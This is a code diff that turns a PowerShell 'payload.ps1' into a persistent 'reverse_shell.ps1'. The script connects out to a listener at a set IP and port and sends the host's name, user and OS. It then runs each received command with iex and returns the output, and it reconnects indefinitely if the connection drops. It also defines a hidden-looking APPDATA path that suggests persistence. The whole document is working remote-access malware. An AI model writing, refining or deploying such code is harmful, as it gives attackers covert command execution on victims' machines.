@@ -1,6 +1,8 @@
-# payload.ps1 - CORRECTED HANDSHAKE PROTOCOL
-$serverIP = "192.168.1.4"  # ← REPLACE WITH YOUR ARCH IP
+# reverse_shell.ps1 - Never disconnects, always reconnects
+$serverIP = "192.168.1.100"  # ← UPDATE WITH YOUR ARCH IP
 $serverPort = 4444
+$reconnectDelay = 15  # Seconds to wait before reconnecting
+$localPayloadPath = "$env:APPDATA\Microsoft\Windows\reverse_shell.ps1"
 
 function Get-SystemInfo {
     $hostname = $env:COMPUTERNAME
@@ -9,35 +11,46 @@ function Get-SystemInfo {
     return "SYSINFO:$hostname|$username|$os"
 }
 
-try {
-    $client = New-Object System.Net.Sockets.TCPClient
-    $client.Connect($serverIP, $serverPort)
-    
-    $stream = $client.GetStream()
-    $writer = New-Object System.IO.StreamWriter($stream)
-    $writer.AutoFlush = $true
-    $reader = New-Object System.IO.StreamReader($stream)
-    
-    # Main loop
-    while ($true) {
-        $command = $reader.ReadLine()
-        if (-not $command) { break }  # Connection closed
+# Main persistent loop (NEVER EXITS)
+while ($true) {
+    try {
+        $client = New-Object System.Net.Sockets.TCPClient
+        $client.Connect($serverIP, $serverPort)
         
-        # SPECIAL HANDLING FOR SYSINFO REQUEST
-        if ($command -eq "SYSINFO?") {
-            $writer.WriteLine((Get-SystemInfo))
-            continue
+        $stream = $client.GetStream()
+        $writer = New-Object System.IO.StreamWriter($stream)
+        $writer.AutoFlush = $true
+        $reader = New-Object System.IO.StreamReader($stream)
+        
+        # Send system info
+        $writer.WriteLine((Get-SystemInfo))
+        
+        # Command execution loop (NEVER EXITS ON ERROR)
+        while ($true) {
+            try {
+                $command = $reader.ReadLine()
+                if (-not $command) { break }  # Server closed connection
+                
+                if ($command -eq "exit") { break }
+                
+                # Execute command (NEVER FAILS THE CONNECTION)
+                $result = iex $command 2>&1 | Out-String
+                $writer.Write($result)
+            }
+            catch {
+                # Send error but KEEP CONNECTION ALIVE
+                $errorOutput = "ERROR: $($_.Exception.Message)`n"
+                $writer.Write($errorOutput)
+            }
         }
-        
-        if ($command -eq "exit") {
-            break
-        }
-        
-        # Execute command and send result
-        $result = iex $command 2>&1 | Out-String
-        $writer.Write($result)
     }
-}
-finally {
-    $client.Close()
+    catch {
+        # Connection failed, but we'll retry
+    }
+    finally {
+        if ($client) { $client.Close() }
+    }
+    
+    # Wait before reconnecting
+    Start-Sleep -Seconds $reconnectDelay
 }
